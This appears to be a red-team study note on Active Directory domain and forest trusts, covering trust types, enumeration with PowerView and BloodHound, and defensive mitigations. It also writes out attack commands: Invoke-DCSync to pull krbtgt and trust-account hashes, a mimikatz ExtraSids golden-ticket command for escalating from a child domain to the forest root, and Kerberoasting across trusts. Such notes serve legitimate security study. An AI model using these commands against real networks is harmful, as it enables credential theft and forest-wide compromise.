---
title: Domain and Forest Trusts
aliases: ["AD Trusts", "Trust", "Trust types", "Trust key", "Trust account"]
type: concept
domain: [active-directory]
tags: [type/concept, domain/active-directory, domain/red-team, proto/kerberos]
source:
  - "[[Source - zer1t0 - Attacking Active Directory]]"
  - "[[Source - harmj0y blog]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[Trust Direction and Transitivity]]", "[[Forest]]", "[[Domain]]", "[[SID History Abuse]]", "[[Inter-realm TGT]]", "[[Golden Ticket]]", "[[DCSync]]", "[[Kerberoasting]]", "[[PowerView]]", "[[Unconstrained Delegation]]"]
created: 2026-06-06
updated: 2026-06-07
---

# Domain and Forest Trusts

> [!summary] One-liner
> A trust is a logical authentication/authorization relationship from one domain to another that lets users of the *trusted* domain access resources in the *trusting* domain.

## What it is
A **trust** is *"a connection from a domain to another"* — not a physical link but an **authentication/authorization relationship**. When a trust is established, **users of the trusted domain can access resources of the trusting domain**.

> Direction is confusing on purpose — see [[Trust Direction and Transitivity]] for direction vs. access flow and for transitivity.

## Trust types
| Type | What it connects | Red-team note |
|---|---|---|
| **Parent-Child** | A parent domain and its child in the same forest | Default; **bidirectional + transitive** |
| **Forest** | Two forests (root↔root) | Misconfiguration can enable **forest takeover** |
| **External** | Two specific domains in *non-trusted* forests | Scoped, often non-transitive |
| **Realm** | AD ↔ a **non-Windows** (e.g. MIT) Kerberos domain | Cross-platform |
| **Shortcut** | Two frequently-communicating domains in the **same forest** | Skips multi-hop trust traversal |

## Trust key
- When a trust is established, the two DCs share a **trust key** for secure communication.
- A **trust account** is created in each domain to store it, named like `DOMAINNAMEB$` (analogous to a [[Computer Accounts|computer account]]).
- The trust key is stored as that account's **NT hash** / **Kerberos keys**.

> [!danger] Why the trust key matters
> Stealing a trust key lets an attacker forge **inter-realm TGTs** to move across the trust → [[Inter-realm TGT]]. Combined with [[SID History Abuse]], a child-domain compromise can escalate to the **forest root**.

## Why a red teamer cares
- Trusts are the highways for **cross-domain / cross-forest lateral movement**.
- The [[Forest]] (not the domain) is the security boundary — intra-forest trusts are generally exploitable end-to-end.

## Related techniques
- [[SID History Abuse]] · [[Inter-realm TGT]] · [[Golden Ticket]] (cross-trust)

---

## More from harmj0y (trust attack taxonomy & enumeration)

> [!info] Source
> The content below is merged from harmj0y's multi-part trust series (see "## Sources"). Anything not directly anchored to those posts is marked [UNVERIFIED].

### Why trusts matter (the core thesis)
Trusts let red teamers move between connected domains **without using a single exploit** — the entire chain relies on native Active Directory functionality and misconfiguration abuse. The typical workflow is:

1. **Reconnaissance** — hunt for users in high-privilege groups across trusts.
2. **Targeting** — identify domain admins / enterprise admins reachable in upstream domains.
3. **Credential harvesting** — `Invoke-MassMimikatz` against compromised hosts ([[LSASS Dumping]]); also PowerSploit's `Invoke-NinjaCopy`.
4. **Lateral movement** — leverage harvested creds across trust boundaries.
5. **Persistence** — extract [[NTDS.dit Extraction|NTDS.dit]] and craft [[Golden Ticket|golden tickets]] for the targeted domain.

> [!note] One-way vs two-way / transitive vs non-transitive
> - **One-way trust**: users in the *trusted* domain access resources in the *trusting* domain, but not vice versa.
> - **Two-way trust**: both domains can access each other's resources. Parent-child relationships are inherently two-way.
> - **Transitive** trusts extend the relationship to other domains (chainable); **non-transitive** trusts do not.

> [!danger] Enterprise Admin reach
> "An enterprise admin in a parent domain automatically has domain administrator access in all of its child domains." Conversely, compromising a **child domain DC** lets you compromise the **entire parent/forest** (see SIDHistory / Trustpocalypse below).

> [!tip] DC-to-DC reachability trick
> Domain controllers of trusting domains must communicate with each other. If a firewall blocks your direct access to a target domain, you can often **hop to one of your current DCs**, which already has the required path to the foreign DC.

### Detailed trust types (harmj0y taxonomy)
| Type | Direction / transitivity | SID filtering |
|---|---|---|
| **Parent/Child** | Implicit two-way transitive (intra-forest) | None (within forest) |
| **Cross-link (shortcut)** | Shortcut between child domains | — |
| **External** | Often one-way, **non-transitive** | **Enforces SID filtering** (quarantine) |
| **Tree-root** | Implicit two-way between forest root and a new tree | None (within forest) |
| **Forest** | Transitive between forest roots | **Enforces SID filtering** (ForestSpecific) |
| **MIT/Realm** | Non-Windows RFC4120 Kerberos | — |

---

## More from harmj0y (trust enumeration)

PowerView exposes three distinct enumeration methods (it has historically renamed functions; both v1.9 and v2.0 names are listed for reference). See [[PowerView]].

### .NET method (excludes forest trusts by default)
```powershell
Get-DomainTrust -NET
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

### Win32 API method (`DsEnumerateDomainTrusts`)
```powershell
Get-DomainTrust -API
# returns SID, GUID, flags, trust attributes; equivalent to:
nltest.exe /trusted_domains
```

### LDAP method (current PowerView default — queries trustedDomain objects)
```powershell
Get-DomainTrust
dsquery * -filter "(objectClass=trustedDomain)" -attr *
adfind.exe -f objectclass=trusteddomain
```

### Forest trust enumeration
```powershell
Get-ForestTrust
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).Domains
```

### Recursive trust mapping (build the full graph)
```powershell
Get-DomainTrustMapping | Export-CSV -NoTypeInformation trusts.csv
# v1.9 equivalent:
Invoke-MapDomainTrusts | Export-CSV -NoTypeInformation trusts.csv
```
- **Visualize**: feed the CSV into **DomainTrustExplorer** (converts to GraphML) and open in **yEd**. Arrow colors: red = parent-child, green = external, blue = crosslinks.

### Global Catalog shortcut (fast intra-forest trust enumeration)
```powershell
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"
```

### Querying foreign domains directly
Most PowerView functions accept `-Domain <foreign.fqdn>` to query a specific (foreign) domain. Requires referral capability / network path to the foreign PDC.
```powershell
Get-DomainTrust    -Domain <foreign.domain.fqdn>
Get-DomainComputer -Domain <foreign.domain.fqdn>
Get-DomainUser     -Domain <foreign.domain.fqdn>
```

### BloodHound / SharpHound collection
```powershell
Invoke-BloodHound -CollectionMethod trusts
Invoke-BloodHound -CollectionMethod trusts,Group,LocalGroup,ACL -Domain <foreign.domain>
```

### PowerView function name reference (v1.9 → v2.0)
| v1.9 | v2.0 |
|---|---|
| `Get-NetForestDomains` | `Get-NetForestDomain` / `Get-NetForest` |
| `Get-NetDomainTrusts` | `Get-NetDomainTrust` → `Get-DomainTrust` |
| `Get-NetForestTrusts` | `Get-NetForestTrust` → `Get-ForestTrust` |
| `Invoke-MapDomainTrusts` | `Invoke-MapDomainTrust` → `Get-DomainTrustMapping` |
| `Invoke-FindUserTrustGroups` | `Find-ForeignUser` (`-Recurse` for all reachable domains) |
| `Invoke-FindAllUserTrustGroups` | `Find-ForeignUser -Recurse` |
| `Invoke-FindGroupTrustUsers` | `Find-ForeignGroup` |
| `Invoke-FindAllGroupTrustUsers` | `Find-ForeignGroup -Recurse` |
| `Get-NetDomainControllers` | `Get-NetDomainController` |
| `Invoke-EnumerateLocalAdmins` | `Invoke-EnumerateLocalAdmin` |
| `Invoke-EnumerateLocalTrustGroups` | `Invoke-EnumerateLocalAdmin -TrustGroups` |

---

## More from harmj0y (trusts you might have missed — foreign principals & cross-domain access)

The "obvious" trust list (`trustedDomain` objects) is not the whole picture. Access can also flow via **foreign principals nested into local/domain-local groups** and via **cross-domain ACLs**.

### Foreign users / foreign group members
```powershell
Get-DomainForeignUser
Get-DomainForeignGroupMember -Domain <target.domain.fqdn>
Get-NetLocalGroupMember <server>          # local groups can contain foreign SIDs
Get-DomainObjectACL -Domain <foreign.domain.fqdn>   # cross-domain ACL access
```

### Foreign Security Principals
External users added to a domain-local group are represented as **Foreign Security Principal** objects, stored under:
```
CN=ForeignSecurityPrincipals,DC=domain,DC=com
```
Enumerate them:
```powershell
Get-DomainObject -LDAPFilter '(objectclass=foreignSecurityPrincipal)'
```

### Cross-domain local-admin hunting (v1.9 idiom)
```powershell
Get-NetDomainControllers -Domain <domain> | Get-NetLocalGroup   # admins on foreign DCs
Invoke-EnumerateLocalAdmins                                     # admins across all machines
Invoke-EnumerateLocalTrustGroups                                # filter to cross-domain / non-domain members
```

### Reachable-trust user/group analysis
- `Find-ForeignUser` — query a domain for all users, extract group membership, flag users in a group **outside** the queried domain. `-Recurse` runs across all reachable trusts.
- `Find-ForeignGroup` — the reciprocal: query all groups, extract members, flag members **outside** the queried domain.

---

## More from harmj0y (the Trustpocalypse — SIDHistory / ExtraSids across trusts)

> [!danger] Child → forest-root escalation
> If you compromise the **DC of a child domain**, you can compromise the **entire parent domain / forest root**. The forest — not the domain — is the security boundary; child-to-parent compromise is architecturally *expected*.

### Mechanism (ExtraSids golden ticket)
1. Compromise the **child domain krbtgt** hash (via [[DCSync]]).
2. Forge a [[Golden Ticket]] with mimikatz, injecting the parent domain's **Enterprise Admins** SID (RID **519**) via the `/sids` (ExtraSids) field.
3. Present the ticket → access parent-domain resources, because intra-forest trusts do **not** SID-filter ForestSpecific SIDs.

```powershell
# 1) pull the child krbtgt hash
Invoke-DCSync -Domain <child.domain>
```
```text
:: 2) forge the cross-domain golden ticket (mimikatz)
kerberos::golden /user:admin /domain:child.domain /sid:S-1-5-21-CHILD-X-Y-Z ^
    /krbtgt:<CHILD_KRBTGT_HASH> /sids:S-1-5-21-ROOT-X-Y-Z-519 /ticket:ticket.kirbi
```

> [!note] Scope
> The ExtraSids / SIDHistory hop works **only across intra-forest trusts** (parent/child, tree-root). It does **not** work across **external** or **inter-forest** trusts, where SID filtering quarantines foreign SIDs.

### SID filtering details
- **AlwaysFilter** — applied universally regardless of trust type.
- **ForestSpecific** — SIDs rejected when they originate "from out of the forest"; this is what blocks the Enterprise Admins (RID 519) trick across forest boundaries.
- **QUARANTINED_DOMAIN flag** (`0x00000004`) — enables SID filtering on external/forest trusts; shown as `FILTER_SIDS` in PowerView output.
- **Internal forest trusts** — no automatic SID filtering → ExtraSids attack succeeds.
- **External trusts (Win2003+)** — SID filtering quarantines external-domain SIDs.
- **Exception**: **Enterprise Domain Controllers** SID `S-1-5-9` bypasses quarantine filtering in intra-forest scenarios; `QuarantinedWithinForest` restricts SIDs to `S-1-5-9`.

### Inter-realm trust-key compromise (persistence)
Extract the trust account hash to forge **referral TGTs** ([[Inter-realm TGT]]). This persists even after the **krbtgt** hash is rotated, though it is often redundant if you already have krbtgt access.
```powershell
Invoke-DCSync -Domain <target> -Account FOREIGN_DOMAIN$
```

### Kerberoasting across trusts
You can [[Kerberoasting|Kerberoast]] accounts in a foreign/forest-trusted domain; use the **FQDN/`@domain` SPN format** for external/forest-trust success.
```powershell
Get-DomainSPNTicket -Domain <foreign.domain> -SPN "SERVICE/host.domain.com@domain.com"
Invoke-Kerberoast -Domain <foreign.domain>
```

---

## Detection / artifacts
- Trust abuse is hard to detect because it rides **normal AD operations**. The **most detectable phase is user-hunting / mass authentication** (touching many machines) — monitor SMB / logon patterns. See [[User Hunting]].
- Inter-realm TGT generation leaves artifacts visible in `klist`.
- LDAP enumeration of foreign domains requires a network path to the foreign **PDC**; segmentation breaks these queries (and may log on non-transitive boundary crossings).
- **Detection gap [UNVERIFIED]**: per a reader comment on the Trustpocalypse post, **no 4675 event** is logged when referral tickets crafted via mimikatz are used to access resources, unlike standard SID-history injection — i.e. the ExtraSids golden-ticket hop can evade SID-history-specific logging.

## Mitigation
- Treat the **forest** (not the domain) as the security boundary; do not place tier-0 assets in less-trusted child domains.
- Enable / verify **SID filtering (quarantine)** on external and forest trusts where appropriate. [UNVERIFIED] exact `netdom trust /quarantine:yes` syntax — confirm against current Microsoft docs before use.
- Rotate **krbtgt** twice on child-domain compromise; remember this does **not** remediate stolen **trust keys** (rotate trust passwords too).
- Minimize cross-domain group nesting and foreign-principal membership in privileged/local groups; audit `ForeignSecurityPrincipals` containers.
- Monitor for [[DCSync]] and Kerberoasting against trust/foreign accounts.

## OPSEC considerations
- LDAP enumeration requires PDC network access — segmentation breaks queries.
- Inter-realm TGT generation creates `klist` artifacts.
- Foreign-trust enumeration may trigger logs when non-transitive boundaries are crossed.
- Global-catalog queries from non-domain-joined machines may fail.

## Related techniques (expanded)
- [[SID History Abuse]] · [[Inter-realm TGT]] · [[Golden Ticket]] · [[DCSync]] · [[Kerberoasting]] · [[NTDS.dit Extraction]] · [[User Hunting]] · [[PowerView]] · [[Unconstrained Delegation]]

## Further reading (from source)
- "It's All About Trust – Forging Kerberos Trust Tickets…" · "A Guide to Attacking Domain Trusts" · "Active Directory forest trusts part 1" · "Inter-Realm Key Roasting" · "Not A Security Boundary: Breaking Forest Trusts"

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "Trusts" (types, trust key, more on trusts)
- [[Source - harmj0y blog]] — "Domain Trusts: Why You Should Care" — https://blog.harmj0y.net/redteaming/domain-trusts-why-you-should-care/
- [[Source - harmj0y blog]] — "Domain Trusts: We're Not Done Yet" — https://blog.harmj0y.net/redteaming/domain-trusts-were-not-done-yet/
- [[Source - harmj0y blog]] — "Trusts You Might Have Missed" — https://blog.harmj0y.net/redteaming/trusts-you-might-have-missed/
- [[Source - harmj0y blog]] — "A Guide to Attacking Domain Trusts" — https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/
- [[Source - harmj0y blog]] — "The Trustpocalypse" — https://blog.harmj0y.net/redteaming/the-trustpocalypse/
